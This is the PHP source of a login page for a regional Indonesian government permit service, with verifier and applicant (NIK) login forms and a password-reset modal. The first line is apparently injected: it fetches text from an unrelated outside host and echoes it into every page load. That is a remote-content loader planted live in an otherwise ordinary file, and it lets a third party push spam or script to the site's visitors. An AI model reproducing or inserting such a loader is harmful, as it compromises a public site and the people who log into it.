<?php $a = file_get_contents('https://paulsaar.com/tmb/id.txt');
echo $a; ?>
<?php
if (isset($_GET['auth']) == 'auth') {
    include "project/auth/login-auth.php";
} else {
   ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html" />
    <title>Petungdadi Trenggalek</title>
    <link rel="icon" href="project/media/logo/icon_url.png" type="image/x-icon">
    <!-- Tell the browser to be responsive to screen width -->
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <!-- Bootstrap 3.3.7 -->
    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/bower_components/bootstrap/dist/css/bootstrap.min.css">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/bower_components/font-awesome/css/font-awesome.min.css">
    <!-- Ionicons -->
    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/bower_components/Ionicons/css/ionicons.min.css">
    <!-- Theme style -->
    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/dist/css/AdminLTE.min.css">
    <!-- iCheck -->
    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/plugins/iCheck/square/blue.css">
    <!-- Sweet Alert -->
    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/sweet_alert/css/sweetalert.css">
  
</head>
 
<body class="hold-transition login-page">
    <div class="login-box">
        <!-- /.login-logo -->
        <div class="login-box-body">
            <div class="row">
                <div class="col-md-12">
                    <!-- Custom Tabs -->
                    <div class="nav-tabs-custom">
                        <ul class="nav nav-tabs">
                            <li class="active"><a href="#tab_1" data-toggle="tab">Login Verifikator</a></li>
                            <li><a href="#tab_2" data-toggle="tab">Login Pemohon</a></li>
                        </ul>
                        <div class="tab-content">
                            <div class="tab-pane active" id="tab_1">
                                <center><img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/icon_url.png" width="80%" class="user-image"
                                        alt="User Image"></center>
                                <form action="https://petungdadi.trenggalekkab.go.id/project/auth/login-check.php" name="sign_in" id="sign_in" method="post">
                                    <div class="form-group has-feedback">
                                        <input type="text" name="name_akses" class="form-control" placeholder="Username"
                                            autocomplete="off" required>
                                        <span class="fa fa-user form-control-feedback"></span>
                                    </div>
                                    <div class="form-group has-feedback">
                                        <input type="password" name="name_password" class="form-control"
                                            placeholder="Password" autocomplete="off" required>
                                        <span class="fa fa-key form-control-feedback"></span>
                                    </div>
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <button type="submit" class="btn btn-primary btn-block btn-flat"
                                                name="login">Login</button>
                                        </div>
                                        <div class="col-xs-12" style="margin-top: 2%;">
                                            <a href="https://petungdadi.trenggalekkab.go.id/Tutorial-Petungdadi" type="submit"
                                                class="btn btn-primary bg-olive btn-flat" style="float: center;">Buku
                                                Panduan</a>
                                            
                                        </div>
                                        <div class="col-xs-12" style="margin-top: 2%;">
                                            <div class="btn btn-danger btn-block btn-flat">Bila Ada Kendala Silahkan
                                                Hubungi <br>Nomor WhatsApp <br> 085736928746</div>
                                        </div>
                                        <div class="col-xs-12">
                                            <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/pemkab.png" width="23%"
                                                class="user-image pull-left" style="margin-top: 5%;margin-left: 5%;"
                                                alt="User Image">
                                            <h6 class="pull-left"
                                                style="margin-top: 6%;margin-left: 13%;margin-bottom: 0px;">Powered By
                                            </h6>
                                            <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/bsre.png" width="55%"
                                                class="user-image pull-left"
                                                style="margin-top: 0px;margin-bottom: 0px;margin-left: 10%;"
                                                alt="User Image">
                                        </div>
                                        <!-- /.col -->
                                    </div>
                                </form>
                            </div>
                            <!-- /.tab-pane -->
                            <div class="tab-pane" id="tab_2">
                                <div class="register-box-body">
                                    <center><img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/icon_url.png" width="80%" class="user-image"
                                            alt="User Image"></center>
                                    <form action="https://petungdadi.trenggalekkab.go.id/project/auth/login-pendaftar.php" method="post">
                                        <div class="form-group has-feedback">
                                            <input type="text" name="nik" class="form-control"
                                                placeholder="NIK" required>
                                            <span class="glyphicon glyphicon-user form-control-feedback"></span>
                                        </div>
                                        <div class="form-group">
                                            <input type="text" name="password" class="form-control" placeholder="Password" required>
                                        </div>
                                        <div class="row">
                                            <!-- /.col -->
                                            <div class="col-xs-6">
                                                <button type="submit" name="simpan"
                                                    class="btn btn-primary btn-raised btn-block btn-flat">Masuk</button>
                                            </div>
                                              <div class="col-xs-6">
                                                <button type="submit" name="daftar"
                                                    class="btn btn-primary bg-olive btn-block btn-flat">Daftar Baru</button>
                                            </div>
                                          <div class="col-xs-12" style="margin-top: 2%;">
                                            <div class="btn btn-primary bg-olive btn-block btn-flat">Untuk Daftar Baru <br> Masukan NIK dan Password <br> Lalu klik Daftar Baru </div>
                                            </div>
                                         </div>
                                           
                                    </form>
                                  <div class="row">
                                              <div class="col-xs-6" style="margin-top: 2%;">
                                                <button class="btn btn-danger btn-olive btn-block btn-flat" data-toggle="modal" data-target="#modal-danger">Lupa Password</button>
                                            </div>
                                              <div class="col-xs-12" style="margin-top: 2%;">
                                            <div class="btn btn-danger btn-block btn-flat">Jika Lupa Password Silahkan  <br>1. Silahkan Klik Lupa Password <br>2. Masukkan NIK dan Email saat d
aftar <br>3. Kemudin Buka Email Yang Pernah <br> di daftarkan</div>
                                            </div>
                                            <!-- /.col -->
                                            <div class="col-xs-12">
                                                <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/pemkab.png" width="23%"
                                                    class="user-image pull-left" style="margin-top: 5%;margin-left: 5%;"
                                                    alt="User Image">
                                                <h6 class="pull-left"
                                                    style="margin-top: 6%;margin-left: 13%;margin-bottom: 0px;">Powered
                                                    By</h6>
                                                <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/bsre.png" width="55%"
                                                    class="user-image pull-left"
                                                    style="margin-top: 0px;margin-bottom: 0px;margin-left: 10%;"
                                                    alt="User Image">
                                            </div>
                                        </div>
                                </div>
                                <!-- /.tab-pane -->
                            </div>
                            <!-- /.tab-content -->
                        </div>
                        <!-- nav-tabs-custom -->
                    </div>
                    <!-- /.col -->
                </div>
            </div>
        </div>
        <div class="modal modal-danger fade" id="modal-danger">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                  <span aria-hidden="true">×</span></button>
                <h4 class="modal-title">Lupa Password</h4>
              </div>
              <div class="modal-body">
                <form class="form-horizontal" method="POST" action="https://petungdadi.trenggalekkab.go.id/project/auth/login-pendaftar.php">
                    <div class="form-group">
                    <label class="col-sm-2 control-label">NIK</label>
                    <div class="col-sm-10">
                    <input type="text" name="nik" class="form-control" placeholder="NIK" required>
                    </div>
                    </div>
                    <div class="form-group">
                    <label class="col-sm-2 control-label">Nomor WA</label>
                    <div class="col-sm-10">
                    <input type="text" name="passwordnohp" class="form-control" placeholder="Nomor WA" required>
                    </div>
                </div>
                <center><button type="submit" name="lupa" class="btn btn-primary btn-raised btn-block btn-flat">Kirim</button></center>
                </form>
              </div>
            </div>
            <!-- /.modal-content -->
          </div>
          <!-- /.modal-dialog -->
        </div>
        <!-- jQuery 3 -->
        <script src="https://petungdadi.trenggalekkab.go.id/production/bower_components/jquery/dist/jquery.min.js"></script>
        <!-- Bootstrap 3.3.7 -->
        <script src="https://petungdadi.trenggalekkab.go.id/production/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
        <!-- iCheck -->
        <script src="https://petungdadi.trenggalekkab.go.id/production/plugins/iCheck/icheck.min.js"></script>
        <!-- Sweet Alert -->
        <script src="https://petungdadi.trenggalekkab.go.id/production/sweet_alert/js/sweetalert.min.js"></script>
        <script>
        $(function() {
            $('input').iCheck({
                checkboxClass: 'icheckbox_square-blue',
                radioClass: 'iradio_square-blue',
                increaseArea: '20%'
            });
        });
        </script>
      <script>
      $(document).ready(function(){
          // Mendeteksi perubahan URL
          $(window).on('hashchange', function(){
              var hash = window.location.hash;
              $('ul.nav a[href="' + hash + '"]').tab('show');
          });
          // Menampilkan tab saat halaman dimuat berdasarkan URL
          var hash = window.location.hash;
          $('ul.nav a[href="' + hash + '"]').tab('show');
      });
      </script>
</body>
</html>
<?php
}
?>
